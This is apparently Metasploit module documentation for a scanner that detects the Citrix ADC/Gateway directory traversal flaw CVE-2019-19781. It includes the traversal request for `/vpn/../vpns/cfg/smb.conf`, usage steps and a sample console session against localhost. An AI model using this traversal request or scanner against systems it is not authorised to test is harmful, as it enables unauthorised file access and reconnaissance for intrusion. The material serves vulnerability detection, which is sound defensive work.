##  Introduction

An issue was discovered in Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0. The vulnerability, tracked as CVE-2019-19781, allows for directory traversal. If exploited, it could allow an unauthenticated attacker to perform arbitrary code execution.

Because vulnerable servers allow for directory traversal, they will accept the request `GET /vpn/../vpns/` and  process it as a request for `GET /vpns/`, a directory that contains PERL scripts that can be targeted to allow for limited file writing on the vulnerable host.

This module checks if a target server is vulnerable by issuing an HTTP GET request for `/vpn/../vpns/cfg/smb.conf`and then checking the response for `global`since this configuration file should contain global variables. If ``global``is found, the server is vulnerable to CVE-2019-19781.

## Verification Steps

1. Install the module as usual

2. Start msfconsole

3. Do: `use auxiliary/scanner/http/citrix_dir_traversal`

4.  Do: `set RHOSTS [IP]`

5. Do: `run`


## Options

1.  `Proxies`  . This option is not set by default.
2.  `RPORT`  . The default setting is  `80`. To use:  `set RPORT [PORT]`
3.  `SSL`  . The default setting is  `false`.
4.  `THREADS`  . The default setting is  `1`.
5.  `VHOST`  . This option is not set by default.

## Scenarios

```
msf5 > use auxiliary/scanner/http/citrix_dir_traversal
msf5 auxiliary(scanner/http/citrix_dir_traversal) > options

Module options (auxiliary/scanner/http/citrix_dir_traversal):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host

msf5 auxiliary(scanner/http/citrix_dir_traversal) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 auxiliary(scanner/http/citrix_dir_traversal) > set rport 8080
rport => 8080
msf5 auxiliary(scanner/http/citrix_dir_traversal) > run

[+] http://127.0.0.1:8080/vpn/../vpns/cfg/smb.conf - The target is vulnerable to CVE-2019-19781.
[+] Obtained HTTP response code 200 including "global" for http://127.0.0.1:8080/vpn/../vpns/cfg/smb.conf. This means that access to /vpns/cfg/smb.conf was obtained via directory traversal.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/http/citrix_dir_traversal) > vulns

Vulnerabilities
===============

Timestamp                Host       Name                                                References
---------                ----       ----                                                ----------
2020-01-13 21:15:28 UTC  127.0.0.1  Citrix ADC (NetScaler) Directory Traversal Scanner  CVE-2019-19781,URL-https://nvd.nist.gov/vuln/detail/CVE-2019-19781/,URL-https://support.citrix.com/article/CTX267027/,EDB-47901,EDB-47902,URL-https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781/

msf5 auxiliary(scanner/http/citrix_dir_traversal) > set rport 8081
rport => 8081
msf5 auxiliary(scanner/http/citrix_dir_traversal) > run

[-] http://127.0.0.1:8081/vpn/../vpns/cfg/smb.conf - The target is not vulnerable to CVE-2019-19781.
[-] Obtained HTTP response code 404 not including "global" for http://127.0.0.1:8081/vpn/../vpns/cfg/smb.conf.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/http/citrix_dir_traversal) >
```

##  References

1. <https://nvd.nist.gov/vuln/detail/CVE-2019-19781>

2. <https://support.citrix.com/article/CTX267027>
